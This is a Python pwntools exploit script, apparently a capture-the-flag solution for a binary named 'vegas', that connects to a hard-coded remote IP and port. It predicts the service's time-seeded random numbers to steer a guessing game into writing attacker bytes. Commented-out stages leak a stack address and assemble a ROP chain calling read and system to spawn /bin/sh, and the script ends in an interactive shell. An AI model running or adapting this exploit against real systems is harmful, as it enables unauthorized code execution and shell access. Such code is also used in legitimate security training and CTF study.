from pwn import *
from ctypes import *
import os
context(log_level = "debug")

lib = cdll.LoadLibrary('./libc64.so')
# elf = ELF("./vegas")
# p = process("./vegas")
p = remote("218.2.197.235", 23747)
# read_plt = elf.symbols["read"]
# system_plt = elf.symbols["system"]
read_plt = 0x80484A0
system_plt = 0x080484E0
ppp_ret = 0x08048777
bbs = 0x0804B0A4
index = 0xb
randlist = []
def genRand(x):
	global randlist
	lib.srand(lib.time(0)+x)
	print lib.time(0)+x
	for i in range(0,0x10):
		randlist.append(lib.rand())
def getnum():
	global randlist
	global index
	v0 = index
	v1 = (randlist[v0])&0xffffffff
	v2 = ((v0+15)&0xf)&0xffffffff
	v3 = randlist[(v0+13)&0xf]&0xffffffff
	v4 = randlist[v2]
	v5 = (randlist[v0 & 0xf] <<16)&0xffffffff
	index = (v0+15)&0xf
	v6 = (v3^v5^v1^((v3<<15)&0xffffffff))
	v7 = randlist[(v0+9)&0xf]^((randlist[(v0+9)&0xf]>>11)&0xffffffff)
	randlist[(v0+10)&0xf] = (v7 ^ v6)&0xffffffff
	result =8 * (v7 ^ v6) & 0xDEADBEE8 ^ ((v7 << 24)&0xffffffff) ^ ((v6 << 10)&0xffffffff) ^ v7 ^ v4 ^ 2 * v4
	randlist[v2] = result&0xffffffff
	return  result

def edit(String):
	# num = getnum()
	# print hex(num)
	global score
	p.recvuntil("ce:\n")
	p.sendline("1")
	p.recvuntil("Not sure\n")
	p.sendline("1")
	p.recvuntil("\n")
	pd = p.recvuntil("\n")
	p.recvuntil("\n")
	if pd == "Right!\n":
		if score <0:
			p.sendline("a")
		else:
			p.sendline(String[score])
		score+=1
	else:
		score-=1

# def back_edit():
# 	num = getnum()
# 	print hex(num)
# 	p.recvuntil("ce:\n")
# 	p.sendline("1")
# 	p.recvuntil("Not sure\n")
# 	if num & 1:
# 		p.sendline("2")
# 	else:
# 		p.sendline("1")
# def getServerRand(ip,port):
# 	for x in range(-0xff,0xff):
# 		try:
# 			p = remote(ip,port)
# 			genRand(x)
# 			num = getnum()
# 			print hex(num)
# 			p.recvuntil("ce:\n")
# 			p.sendline("1")
# 			p.recvuntil("Not sure\n")
# 			p.sendline("3")
# 			ServerRand = p.recvuntil("\n")[len("The number is "):-1]
# 			# print hex(int(ServerRand,16))
# 			# print hex(num)
# 			if int(ServerRand,16) ==num:
# 				return x
# 			else:
# 				p.close()
# 				continue
# 		except:
# 			p.close()
# 			continue
		# break
score = 0
string = "a"*0x44
while score != len(string):
		edit(string)
# gdb.attach(p,"b*0x08048A6F\nc")
# gdb.attach(p,"b*0x08048A6F\nc")
# gdb.attach(p,"b*0x08048600\nc")
# gdb.attach(p,"b*0x8048AEB\nc")

# print getServerRand("218.2.197.235", 23747)

# i = 0
# payload1 = 'a'
# while i < len(payload1):
# 	edit(payload1[i])
# 	i = i+1
# stack_addr = u32(p.recv(0x48)[-4:])-0x90 - 0x40
# print "stack_addr:"+hex(stack_addr)


# i = 0
# while i < 0x24:
# 	back_edit()
# 	i = i+1

# i = 0
# payload3 = p32(stack_addr)
# while i < len(payload3):
# 	edit(payload3[i])
# 	i = i+1

# i = 0
# while i < 0x24:
# 	back_edit()
# 	i = i+1
# execString = "/bin/sh\0"
# ROPpayload = p32(read_plt)+p32(ppp_ret)+p32(0)+p32(bbs)+p32(len(execString))+p32(system_plt)+p32(0)+p32(bbs)
# i = 0
# while i < len(ROPpayload):
# 	edit(ROPpayload[i])
# 	i = i+1
# p.sendline("3")
# p.send(execString)
p.interactive()
